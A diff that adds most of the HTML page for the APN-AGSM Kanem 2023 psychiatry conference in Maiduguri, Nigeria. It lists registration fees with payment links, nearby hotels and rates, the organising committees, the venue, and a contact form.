+        }
+          }
+      </style>
+
+
+
+
+
+
+
+
+
+
+
+</tbody>
+</table>
+</center>
+</div>
+</div>
+
+
+
+<div class="table-responsive-md">
+
+
+<center><table class="table table-bordered table-dark">
+
+  <thead style="background-color: yellow">
+<tr>
+    
+
+    <th scope="col"><h6 style="color: yellow"><b><div class="blink_me"><img src="assets/img/10cpd.jpg" style="width: 100px;"></div></b><br><b>CATEGORY</b></h6></th>
+    <th scope="col"><h6 style="color: yellow"><b>VIRTUAL</b></h6></th>
+   
+
+</tr>
+
+</thead>
+
+<tbody>
+
+  <tr>
+
+
+
+      <td><b><span style="text-transform: uppercase;"> Fellows</span></b></td>
+    
+   <center><td>50,000 <a href="https://paystack.com/pay/apnagsmkanemvirtual2"><div class="blink_me"title="pay"><mark style="color: green"><b>Pay Now!!</b></mark></div></a></td></center>
+
+    
+    <br>
+
+ 
+</tr>
+
+<tr>
+
+
+
+
+      <td><b><span style="text-transform: uppercase;"> Members / Others</span></b></td>
+   
+
+  <center> <td>40,000 <a href="https://paystack.com/pay/apnagsmkanemvirtual1"><div class="blink_me"title="pay"><mark style="color: green"><b>Pay Now!!</b></mark></div></a></td></center>
+
+    
+    
+
+ 
+</tr>
+
+
+
+
+
+   
+
+ </tr>
+</tbody>
+</table>
+</center>
+</div>
+
+
+<br>
+<div class="container" data-aos="fade-right">
+
+<center><h2 style="color: green;">  <b>PAY-IN-USD ??</b> <a href="#usd.html" title="pay in dollars"><span> <i><small>Pay / Click  Here</small></i></span></a></h2></center>
+
+</div>
+
+
+ 
+
+     
+
+
+
+
+
+
+
+
+ <!-- ======= Hotels Section ======= -->
+    <section id="hotels" class="section-with-bg">
+
+        <style>
+             .blink_me {
+            animation: blinker 2s linear infinite;
+       color: white;
+
+      
+          }
+
+        @keyframes blinker {
+         50% {
+        opacity: 0;
+         loop: 4;
+
+
+        }
+          }
+      </style>
+ <!-- ======= Schedule Section ======= -->
+    <section id="schedule" style="background-color: white;">
+      <div class="container" data-aos="fade-up">
+        <div class="section-header">
+          <h2 style="color: green">Hotel</h2>
+         <p><mark><b>OUR NEARBY HOTELS</b></mark></p>
+        </div>
+
+
+        <div class="row" data-aos="fade-up" data-aos-delay="100">
+
+          <div class="col-lg-4 col-md-6">
+            <div class="hotel">
+              <div class="hotel-img">
+                <a href="assets/img/hotels/h (1).jpg">
+                <img src="assets/img/hotels/h (1).jpg" alt="Hotel 1" class="img-fluid">
+              </div></a>
+              <h3><a href="#">AMADA INTERNATIONAL HOTEL</a><br><small><span style="color: red">1 Magira Road, Maiduguri</span></small></h3>
+              <div class="stars">
+                <i class="bi bi-star-fill"></i>
+                <i class="bi bi-star-fill"></i>
+                <i class="bi bi-star-fill"></i>
+                <i class="bi bi-star-fill"></i>
+                <i class="bi bi-star-fill"></i>
+              </div>
+              <p>5.3 Mile (18 min) from the Venue<br>
+              <i>Rate per Night: Standard/Classic = <b>35,500</b></i></p>
+
+              <a href="https://forms.gle/vLoLj7dhjjo3ReSs9"><button class="btn-primary rounded-pill" style="color: white"><span style="float: left;font-family: 'Rubik Dirt', cursive;"><div class="blink_me"><b>BOOK NOW</b></div></span></button></a>
+              <a href="https://paystack.com/pay/apnagsmkanemhotel"><span style="float: right;color: white;font-family: 'Rubik Dirt', cursive;"><button class="btn-danger rounded-pill"><div class="blink_me"> <b>PAY NOW</b></i> >>></div></button></span></a>
+            </div>
+          </div>
+
+          <div class="col-lg-4 col-md-6">
+            <div class="hotel">
+              <div class="hotel-img">
+                <a href="assets/img/hotels/h (2).jpg">
+                <img src="assets/img/hotels/h (2).jpg" alt="Hotel 2" class="img-fluid"></a>
+              </div>
+              <h3><a href="#">GRAND PINNACLE LUXURY HOTEL</a><br><small><span style="color: red">Kashim Ibrahim Road, Maiduguri</span></small></h3>
+              <div class="stars">
+                <i class="bi bi-star-fill"></i>
+                <i class="bi bi-star-fill"></i>
+                <i class="bi bi-star-fill"></i>
+                <i class="bi bi-star-fill"></i>
+                <i class="bi bi-star-fill-half-full"></i>
+              </div>
+              <p>3.3 Mile (7 min) from the Venue<br>
+              <i>Rate per Night: Standard/Classic = <b>27,000</b></i></p>
+
+              <a href="https://forms.gle/vLoLj7dhjjo3ReSs9"><button class="btn-primary rounded-pill" style="color: white"><span style="float: left;font-family: 'Rubik Dirt', cursive;"><div class="blink_me"><b>BOOK NOW</b></div></span></button></a>
+              <a href="https://paystack.com/pay/apnagsmkanemhotel"><span style="float: right;color: white;font-family: 'Rubik Dirt', cursive;"><button class="btn-danger rounded-pill"><div class="blink_me"> <b>PAY NOW</b></i> >>></div></button></span></a>
+            </div>
+          </div>
+
+
+            <div class="col-lg-4 col-md-6">
+            <div class="hotel">
+              <div class="hotel-img">
+                <a href="assets/img/hotels/h (4).jpg">
+                <img src="assets/img/hotels/h (4).jpg" alt="Hotel 2" class="img-fluid"></a>
+              </div>
+              <h3><a href="#">AIBA RESORT HOTEL</a><br><small><span style="color: red">1, Aiba Resort Cresent,Maduganari Byepass, Maiduguri</span></small></h3>
+              <div class="stars">
+                <i class="bi bi-star-fill"></i>
+                <i class="bi bi-star-fill"></i>
+                <i class="bi bi-star-fill"></i>
+                
+                <i class="bi bi-star-fill-half-full"></i>
+              </div>
+              <p>4.1 Mile (13 min) from the Venue<br>
+              <i>Rate per Night: Standard/Classic = <b>17,000</b></i></p>
+
+              <a href="https://forms.gle/vLoLj7dhjjo3ReSs9"><button class="btn-primary rounded-pill" style="color: white"><span style="float: left;font-family: 'Rubik Dirt', cursive;"><div class="blink_me"><b>BOOK NOW</b></div></span></button></a>
+              <a href="https://paystack.com/pay/apnagsmkanemhotel"><span style="float: right;color: white;font-family: 'Rubik Dirt', cursive;"><button class="btn-danger rounded-pill"><div class="blink_me"> <b>PAY NOW</b></i> >>></div></button></span></a>
+            </div>
+          </div>
+
+
+
+            <div class="col-lg-4 col-md-6">
+            <div class="hotel">
+              <div class="hotel-img">
+                <a href="assets/img/hotels/h (5).jpg">
+                <img src="assets/img/hotels/h (5).jpg" alt="Hotel 2" class="img-fluid"></a>
+              </div>
+              <h3><a href="#">COMMAND GUEST HOUSE</a><br><small><span style="color: red">Baga Road, Maiduguri</span></small></h3>
+              <div class="stars">
+                <i class="bi bi-star-fill"></i>
+                <i class="bi bi-star-fill"></i>
+                <i class="bi bi-star-fill"></i>
+                
+               
+              </div>
+              <p>3.5 Mile (8 min) from the Venue<br>
+              <i>Rate per Night: Standard/Classic = <b>22,000</b></i></p>
+
+              <a href="https://forms.gle/vLoLj7dhjjo3ReSs9"><button class="btn-primary rounded-pill" style="color: white"><span style="float: left;font-family: 'Rubik Dirt', cursive;"><div class="blink_me"><b>BOOK NOW</b></div></span></button></a>
+              <a href="https://paystack.com/pay/apnagsmkanemhotel"><span style="float: right;color: white;font-family: 'Rubik Dirt', cursive;"><button class="btn-danger rounded-pill"><div class="blink_me"> <b>PAY NOW</b></i> >>></div></button></span></a>
+            </div>
+          </div>
+
+
+        <div class="col-lg-4 col-md-6">
+            <div class="hotel">
+              <div class="hotel-img">
+                <a href="assets/img/hotels/h (6).jpg">
+                <img src="assets/img/hotels/h (6).jpg" alt="Hotel 2" class="img-fluid"></a>
+              </div>
+              <h3><a href="#">CITY STAR HOTEL</a><br><small><span style="color: red">Magaram Road, Old GRA, Maiduguri</span></small></h3>
+              <div class="stars">
+                <i class="bi bi-star-fill"></i>
+                <i class="bi bi-star-fill"></i>
+                <i class="bi bi-star-fill"></i>
+                
+                <i class="bi bi-star-fill-half-full"></i>
+              </div>
+              <p>5.0 Mile (15 min) from the Venue<br>
+              <i>Rate per Night: Standard = <b>42,000</b></i><br>
+              <i>Rate per Night: Delux = <b>55,000</b></i></p>
+
+              <a href="https://forms.gle/vLoLj7dhjjo3ReSs9"><button class="btn-primary rounded-pill" style="color: white"><span style="float: left;font-family: 'Rubik Dirt', cursive;"><div class="blink_me"><b>BOOK NOW</b></div></span></button></a>
+              <a href="https://paystack.com/pay/apnagsmkanemhotel"><span style="float: right;color: white;font-family: 'Rubik Dirt', cursive;"><button class="btn-danger rounded-pill"><div class="blink_me"> <b>PAY NOW</b></i> >>></div></button></span></a>
+            </div>
+          </div>
+          
+
+        
+
+        <div class="container bg-light" style="color: green"><br>
+              <h3><marquee scrollamount="4"><center><span style="font-family: Comforter; color: green"> <b>ENQUIRIES FOR HOTEL:</b></span><i> Please Call</i> <span style="color:red"><b>08037182754 or 08035519920</b></span> or send message: <span style="color:green"><b>apnagsmmaiduguri2023@gmail.com</b></span></center></marquee></h3>
+
+            </div>
+
+
+</div>
+
+      </div>
+
+</div>
+</section>
+
+         <!-- ======= Schedule Section ======= -->
+    <section id="schedule">
+      <div class="container" data-aos="fade-up">
+        <div class="section-header">
+          <h2 style="color: green">Accomodation</h2>
+         <p><mark><b>Hotel Booking</b></mark></p>
+        </div>
+
+
+
+        <center> <h5 style="color: darkgreen; font-family: 'Rubik Dirt', cursive;
+" class="text-center"><b>Our hotels are available at rates between N25,000 and N65,000 per night</b></h5></center>
+        
+
+        <h5 style="text-align:right;"><a href="https://paystack.com/pay/apnagsmkanemhotel"><button class="bg-warning rounded-pill"><span style="color: white"><b>BOOK NOW !!!</b></span></button></a></h5>
+    
+
+     
+
+        
+
+</div>
+
+
+     <!-- ======= Schedule Section ======= -->
+    <section id="schedule">
+      <div class="container" data-aos="fade-up">
+        <div class="section-header">
+          <h2 style="color: green">Sponsorship</h2>
+         <p><mark><b>Donation</b></mark></p>
+        </div>
+
+
+
+
+  <center> <h5 style="color:  green; font-family: 'Rubik Dirt', cursive;
+" class="text-center"><b>To DONATE or SPONSOR us, Kindly click this button</b></h5></center>
+        
+
+        <h5 style="text-align:right;"><a href="https://paystack.com/pay/apnagsmkanemsponsor"><button class="bg-warning rounded-pill"><span style="color: white"><b>Sponsor us !!!</b></span></button></a></h5>
+   
+   </div>
+
+
+ 
+
+
+
+
+      <!-- ======= Schedule Section ======= -->
+    <section id="schedule">
+      <div class="container" data-aos="fade-up">
+        <div class="section-header">
+          <h2 style="color: green">Certificate of Participation</h2>
+         
+        </div>
+
+<hr>
+<hr>
+
+     
+  <center> <h5 style="color: ; font-family: 'Rubik Dirt', cursive;
+" class="text-center"><b>Kindly click this button to apply for your conference certificate</b></h5></center>
+        
+
+        <h5 style="text-align:right;"><a href="https://forms.gle/EWr6m5sk4ydTFSWq5"><button class="bg-warning rounded-pill"><span style="color: white"><b>Apply here!!!</b></span></button></a></h5>
+
+  </div>
+
+
+              <h5><marquee scrollamount= "4"><span style="font-family: Comforter; color: green"> <b>ENQUIRIES:</b></span> <span style="color:red"><b>08067216316 or 08035387879</b></span> <br><span style="color:green"><b>apnagsmmaiduguri2023@gmail.com</b></span></marquee></h5>
+
+
+
+
+      
+
+
+
+   
+    
+<br>
+          
+        
+   
+
+
+    <!-- ======= Speakers Section ======= -->
+
+   <section>
+
+      <div class="container" data-aos="fade-up">
+        <div class="section-header">
+          <h2 style="font-family: 'Caprasimo', cursive;">Central Planning Committee</h2>
+         <h5 style="color: darkgreen; font-family: 'Rubik Dirt', cursive;
+" class="text-center"><b>Our Central Planning Members</b></h5>
+        </div>
+      </div>
+
+    
+
+
+    <!-- ======= Speakers Section ======= -->
+
+    <div class="container">
+    
+
+        <div class="row">
+          <div class="col-md-4">
+            <div class="speaker" data-aos="slide-left" data-aos-delay="100">
+              <center><img src="assets/img/speakers/mdd.jpg" alt="Speaker 1" class="rounded-pill" ></center>
+              <div class="details">
+
+                 <center> <h3 style="color: green"><b><i>Prof. </i> Ibrahim Abdu Wakawa</b></br><span style="color: red; font-family: 'Bruno Ace', cursive;"> CHAIRMAN</span></h3></div></center>
+                
+
+              
+              
+            </div>
+          </div>
+          <br>
+          <div class="col-md-4">
+            <div class="speaker" data-aos="fade-right" data-aos-delay="100">
+              <center><img src="assets/img/speakers/1 (2).jpg" alt="Speaker 2" class="rounded-pill" ></center>
+              <div class="details">
+                 <center> <h3 style="color: green"><b>Dr. Hauwa Ahmed Kudale</b></br><span style="color: red; font-family: 'Bruno Ace', cursive;"> VICE-CHAIRMAN</span></h3></div></center>
+                
+                
+              
+            </div>
+          </div>
+<br>
+
+
+          <div class="col-md-4">
+            <div class="speaker" data-aos="slide-right" data-aos-delay="120">
+             <center> <img src="assets/img/speakers/1 (5).jpg" alt="Speaker 4" class="rounded-pill" ></center>
+              <div class="details">
+                <center> <h3 style="color: green"><b>Dr. Umar Baba Musami</b></br><span style="color: red; font-family: 'Bruno Ace', cursive;"> COORDINATOR, PROTOCOL & LOGISTICS</span></h3></div></center>
+
+                 
+            
+            </div>
+          </div>
+          <div class=" col-md-6">
+            <div class="speaker" data-aos="slide-left" data-aos-delay="130">
+              <center><img src="assets/img/speakers/1 (1).jpg" alt="Speaker 3" class="rounded-pill" ></center>
+              <div class="details">
+                <center> <h3 style="color: green"><b>Dr. Asmau M.C Dahiru</b></br><span style="color: red; font-family: 'Bruno Ace', cursive;"> APN REPRESENTATIVE</span></h3></div></center>
+
+
+            
+            </div>
+          </div>
+          
+          <div class="col-md-6" data-aos=>
+            <div class="speaker" data-aos="fade-left" data-aos-delay="100">
+             <center> <img src="assets/img/gallery/mahmoodd.jpg" alt="Speaker 5" class="rounded-pill" ></center>
+              <div class="details">
+                <center><h3 style="color: green"><b>Dr. Mahmood Mohammed Yusuf</b></br><span style="color: red; font-family: 'Bruno Ace', cursive;"> SECRETARY - LOC</span></h3></div></center>
+
+
+
+                 
+               
+              </div>
+            </div>
+          </div>
+          </div>
+        </div>
+
+    </section><!-- End Speakers Section -->
+             <br>
+
+   
+      <div class="container" data-aos="fade-up">
+        <div class="section-header">
+          <h2 style="font-family: 'Caprasimo', cursive;">Local organizing Committee</h2>
+         <h5 style="color: darkgreen; font-family: 'Rubik Dirt', cursive;
+" class="text-center"><b>Our L.O.C</b></h5>
+        </div>
+      </div>
+
+     
+     <center> <div class="gallery-slider swiper">
+        <div class="swiper-wrapper align-items-center">
+          <div class="swiper-slide"><a href="assets/img/gallery/a (6).jpg" class="gallery-lightbox"><img src="assets/img/gallery/a (6).jpg" style="width:230px" class="" alt=""></a><h4 style="color: green"><b>Dr. Anthony Ali Mshelia</b></br><span style="color: red"> Fund Raising & Finance</span></h4></div>
+
+
+          <div class="swiper-slide"><a href="assets/img/gallery/1 (23).jpg" class="gallery-lightbox"><img src="assets/img/gallery/1 (23).jpg" class="img-fluid" alt="" style="width:230px"></a><h4 style="color: green"><b>Dr. Placidus N. Ogualili</b><br><span style="color: red"> Scientific</span></h4></div>
+
+           <div class="swiper-slide"><a href="assets/img/gallery/prof.jpeg" class="gallery-lightbox"><img src="assets/img/gallery/prof.jpeg" class="img-fluid" alt="" style="width:230px"></a><h4 style="color: green"><b>Prof. Sadique Kwajaffa Pindar</b><br><span style="color: red"> Media & Publicity</span></h4></div>
+
+         
+          <div class="swiper-slide"><a href="assets/img/gallery/1 (9).jpg" class="gallery-lightbox"><img src="assets/img/gallery/1 (9).jpg" class="img-fluid" alt="" style="width:230px"></a><h4 style="color: green"><b>Dr. Ibrahim Adamu Mshelia</b><br><span style="color: red">Accomodation</span></h4></div>
+
+          <div class="swiper-slide"><a href="assets/img/gallery/a (2).jpeg" class="gallery-lightbox"><img src="assets/img/gallery/a (2).jpeg" class="img-fluid" alt=""style="width:230px"></a><h4 style="color: green"><b>Dr. Babagana Kundi Machina </b><br><span style="color: red"> Registration</span></h4></div>
+
+
+          <div class="swiper-slide"><a href="assets/img/gallery/a (4).jpg" class="gallery-lightbox"><img src="assets/img/gallery/k (2).jpg" class="img-fluid" alt=""style="width:230px"></a><h4 style="color: green"><b>Dr. Fatima Abba Alli  <br>  </b><span style="color: red"> Communique Drafting</span></h4></div>
+
+          <div class="swiper-slide"><a href="assets/img/gallery/a (1).jpg" class="gallery-lightbox"><img src="assets/img/gallery/a (1).jpg" class="img-fluid" alt=""style="width:230px"></a><h4 style="color: green"><b>Dr. Yesiru Kareem Adeyemi</b><br><span  style="color: red"> ARD Reps</span></h4></div>
+
+          <div class="swiper-slide"><a href="assets/img/gallery/cr.jpg" class="gallery-lightbox"><img src="assets/img/gallery/cr.jpg" class="img-fluid" alt=""style="width:230px"></a><h4 style="color: green"><b>Dr. Abdulhakeem M. Ngulde</b><br><span style="color: red"> Chief Resident</span></h4></div>
+
+             <div class="swiper-slide"><a href="assets/img/gallery/shet.jpeg" class="gallery-lightbox"><img src="assets/img/gallery/shet.jpeg" class="img-fluid" alt=""style="width:230px"></a><h4 style="color: green"> <b>Dr. Falmata Baba Shetima</b><br><span style="color: red"> Feeding & Refreshment</span></h4></div>
+
+             <div class="swiper-slide"><a href="assets/img/gallery/a (2).jpg" class="gallery-lightbox"><img src="assets/img/gallery/a (2).jpg" class="img-fluid" alt=""style="width:230px"></a><h4 style="color: green"><b>Alh. Dauda Aliyu Protocol</b><br><span style="color: red">Protocol</span></h4></div>
+
+             <div class="swiper-slide"><a href="assets/img/gallery/dapsy.jpg" class="gallery-lightbox"><img src="assets/img/gallery/dapsy.jpg" class="img-fluid" alt="" style="width:230px"></a><h4 style="color: green"><b>Engr. Dapo Anifowose</b><br><span style="color: red"> I.T Consultant</span></h4></div>
+
+
+
+        </div>
+        <div class="swiper-pagination"></div>
+      </div>
+     
+
+    </section><!-- End Gallery Section -->
+
+
+    
+  
+ <!-- ======= Schedule Section ======= -->
+    <section id="schedule">
+      <div class="container" data-aos="fade-up">
+        <div class="section-header">
+          <h2 style="color: green">CONFERENCE VENUE</h2>
+
+       
+        </div>
+
+       <div class="row">
+
+
+          <div class="col-md-6" style="color: black;">
+
+
+           <a href="assets/img/myl (1).jpg"> <img src="assets/img/myl (1).jpg" style="float: left; width: 110px"></a><a href="assets/img/myl (2).jpg"><img src="assets/img/myl (2).jpg" style="float: right; width: 120px;"></a>
+           
+              
+            <h2>   <center> Federal Neuropsychiatric Hospital Maiduguri </center></h2>
+                <center><h5>Baga Road, Maiduguri, Borno state, Nigeria</h5></center></h3>
+              </div>
+            
+             <div class="col-md-6">
+       
+<center><div><iframe src="https://www.google.com/maps/embed?pb=!1m28!1m12!1m3!1d62473.189332682065!2d13.077433734780218!3d11.86504071944085!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!4m13!3e6!4m5!1s0x1104992f85a6bb39%3A0xa72b11352d7d9e8e!2sFederal%20Neuro-Psychiatric%20Hospital%2C%20ibrahim%2C%20Baga%20Road%2C%20taiwo%20street%2C%20Mmc%2C%20Maiduguri!3m2!1d11.8650437!2d13.118633599999999!4m5!1s0x1104992f85a6bb39%3A0xa72b11352d7d9e8e!2sFederal%20Neuro-Psychiatric%20Hospital%2C%20ibrahim%2C%20Baga%20Road%2C%20taiwo%20street%2C%20Mmc%2C%20Maiduguri!3m2!1d11.8650437!2d13.118633599999999!5e0!3m2!1sen!2sng!4v1689529418673!5m2!1sen!2sng" width="400" height="350" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe></div></center>
+      </div>
+    </div>
+  </div>
+
+</section>
+      <!--<div class="container-fluid venue-gallery-container" data-aos="fade-up" data-aos-delay="100">
+        <div class="row g-0">
+
+          <div class="col-lg-3 col-md-4">
+            <div class="venue-gallery">
+              <a href="assets/img/venue-gallery/1.jpg" class="glightbox" data-gall="venue-gallery">
+                <img src="assets/img/venue-gallery/1.jpg" alt="" class="img-fluid">
+              </a>
+            </div>
+          </div>
+
+          <div class="col-lg-3 col-md-4">
+            <div class="venue-gallery">
+              <a href="assets/img/venue-gallery/2.jpg" class="glightbox" data-gall="venue-gallery">
+                <img src="assets/img/venue-gallery/2.jpg" alt="" class="img-fluid">
+              </a>
+            </div>
+          </div>
+
+          <div class="col-lg-3 col-md-4">
+            <div class="venue-gallery">
+              <a href="assets/img/venue-gallery/3.jpg" class="glightbox" data-gall="venue-gallery">
+                <img src="assets/img/venue-gallery/3.jpg" alt="" class="img-fluid">
+              </a>
+            </div>
+          </div>
+
+          <div class="col-lg-3 col-md-4">
+            <div class="venue-gallery">
+              <a href="assets/img/venue-gallery/4.jpg" class="glightbox" data-gall="venue-gallery">
+                <img src="assets/img/venue-gallery/4.jpg" alt="" class="img-fluid">
+              </a>
+            </div>
+          </div>
+
+          <div class="col-lg-3 col-md-4">
+            <div class="venue-gallery">
+              <a href="assets/img/venue-gallery/5.jpg" class="glightbox" data-gall="venue-gallery">
+                <img src="assets/img/venue-gallery/5.jpg" alt="" class="img-fluid">
+              </a>
+            </div>
+          </div>
+
+          <div class="col-lg-3 col-md-4">
+            <div class="venue-gallery">
+              <a href="assets/img/venue-gallery/6.jpg" class="glightbox" data-gall="venue-gallery">
+                <img src="assets/img/venue-gallery/6.jpg" alt="" class="img-fluid">
+              </a>
+            </div>
+          </div>
+
+          <div class="col-lg-3 col-md-4">
+            <div class="venue-gallery">
+              <a href="assets/img/venue-gallery/7.jpg" class="glightbox" data-gall="venue-gallery">
+                <img src="assets/img/venue-gallery/7.jpg" alt="" class="img-fluid">
+              </a>
+            </div>
+          </div>
+
+          <div class="col-lg-3 col-md-4">
+            <div class="venue-gallery">
+              <a href="assets/img/venue-gallery/8.jpg" class="glightbox" data-gall="venue-gallery">
+                <img src="assets/img/venue-gallery/8.jpg" alt="" class="img-fluid">
+              </a>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </section><!-- End Venue Section -->
+
+   
+
+
+       
+
+     
+
+
+
+
+ 
+      <div class="container" data-aos="fade-up">
+        <div class="section-header">
+          <h2 style="color: green">Letter of invitation</h2>
+         
+        </div>
+
+
+
+
+  <center> <h5 style="color: darkgreen; font-family: 'Rubik Dirt', cursive;
+" class="text-center"><b>Click this button to get your Invitation Letter</b></h5></center>
+        
+
+        <h5 style="text-align:right;"><a href="http://invitation.apnagsmkanem2023.org/"><button class="bg-warning rounded-pill"><span style="color: white"><b>Download your Letter</b></span></button></a></h5>
+   
+   </div>
+
+<!-- End Subscribe Section -->
+<br>
+
+   
+    <!-- ======= Contact Section ======= -->
+    <section style="background-color:floralwhite;">
+
+      <div class="container" data-aos="fade-up">
+
+        <div class="section-header"><br>
+          <h2 style="color: green">Contact Us</h2>
+          <p>Federal Neuro-Psychiatric Hospital</p>
+        </div>
+
+        <div class="row contact-info">
+
+          <div class="col-md-6">
+            <div class="contact-address">
+              <i class="bi bi-geo-alt"></i>
+              <h3 style="color: green">Address</h3>
+              <p>Maiduguri, Borno State, Nigeria
+          </p>
+          </div>
+        </div>
+
+          
+
+          <div class="col-md-6">
+            <div class="contact-email">
+              <i class="bi bi-envelope"></i>
+              <h3 style="color: green">Email</h3>
+              <a href="mailto:apnagmmaiduguri2023@gmail.com"><p>apnagmmaiduguri2023@gmail.com</p></a>
+            </div>
+          </div>
+
+        </div>
+
+        <center>     <form method="POST" action="https://formsubmit.co/apnagmmaiduguri2023@gmail.com" enctype="multipart/form-data">
+            <input type="hidden" name="_subject" value="APN AGSM KANEM 2023">
+            <input type="hidden" name="_cc" value="apnagmmaiduguri2023@gmail.com">
+
+            <input type="hidden" name="_next" class="text-danger" value="http://apnagsmkanem2023.org/thankss.html">
+            <input type="hidden" name="_autoresponse" value="Your mail has been acknowledged.">
+            <input type="hidden" name="_captcha" value="false">
+
+       
+         
+            <div class="row">
+              <div class="form-group col-md-6">
+                <input type="text" name="name" class="form-control" id="name" placeholder="Your Name" required>
+                    <div class="validate"></div>
+              </div>
+
+              <div class="form-group col-md-6 mt-3 mt-md-0">
+                <input type="email" class="form-control" name="email" id="email" placeholder="Your Email" required>
+                <div class="validate"></div>
+              </div>
+              
+            </div>
+            <div class="form-group mt-3">
+              <input type="text" class="form-control" name="subject" id="subject" placeholder="Subject" required>
+              <div class="validate"></div>
+            </div>
+            <div class="form-group mt-3">
+              <textarea class="form-control" name="message" rows="5" placeholder="Message" required></textarea>
+              <div class="validate"></div>
+            </div><br>
+            
+            <div class="text-center"><button type="submit" class="btn btn-danger rounded rounded-pill">Send Message</button></div>
+          </form>
+        </div>
+
+      </div>
+   </center>
+ </div>
+</section>
+
+
+</main>
+
+
+  <!-- End #main -->
+
+  <!-- ======= Footer ======= -->
+  
+    <div class="footer-top"  style="background-color:lightcyan;">
+      <div class="container">
+        <div class="row">
+
+          <div class="col-md-4">
+            <center><img src="assets/img/log.jpg" alt="" style="width:120px"><br>
+            <h1 style="font-family: 'Caprasimo', cursive;">FNPH Maiduguri</h1>
+            <p>APN-AGSM <br>Kanem 2023</p></center>
+          </div>
+
+          <div class=" col-md-4 footer-links" style="color:green">
+            <b><h4 style="color: green; font-family: 'Caprasimo', cursive;">Useful Links</h4></b>
+            <ul>
+              <li><i class="bi bi-chevron-right"></i> <a href="index.html">Home</a></li>
+              <li><i class="bi bi-chevron-right"></i> <a href="committee.html">Local Organizing Committee</a></li>
+             
+               <li><i class="bi bi-chevron-right"></i> <a href="#usd.html">Pay-in-USD</a></li>
+               <br>
+               <li><i class="bi bi-chevron-right"></i> <a href="http://abstract.apnagsmkanem2023.org/">Submit Abstract</a></li>
+               <li><i class="bi bi-chevron-right"></i> <a href="http://invitation.apnagsmkanem2023.org/">Get Your Invitation Letter</a></li>
+            </ul>
+          </div>
+
+        
+          
+
+          <div class="col-md-4 footer-contact">
+            <b><h4 style="color: green; font-family: 'Caprasimo', cursive;">Contact Us</h4></b>
+            <p>
+              F.N.P.H <br>
+              Maiduguri,Borno State<br>
+               Nigeria <br>
+              <strong>Email:</strong> contactus@fnphmaiduguri.gov.ng<br>
+              <strong>Email:</strong> apnagsmmaiduguri2023@gmail.com<br>
+            </p>
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+ <center>   <div class="container" style="color: green">
+      <div class="copyright">
+        &copy; Copyright <strong>FNPH Maiduguri</strong>. All Rights Reserved
+      </div>
+      <div class="credits">
+      
+        <i>Powered by <a href="https://supremelinks.com.ng/">Supremelinks</a></i>
+      </div>
+    </div>
+  </footer><!-- End  Footer --></center>
+
+  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>
+
+  <!-- Vendor JS Files -->
+  <script src="assets/vendor/aos/aos.js"></script>
+  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
+  <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>
+  <script src="assets/vendor/php-email-form/validate.js"></script>
+
+  <!-- Template Main JS File -->
+  <script src="assets/js/main.js"></script>
+
+</body>
+
+</html>
+
+
+
+
+
+
+
+
+
+
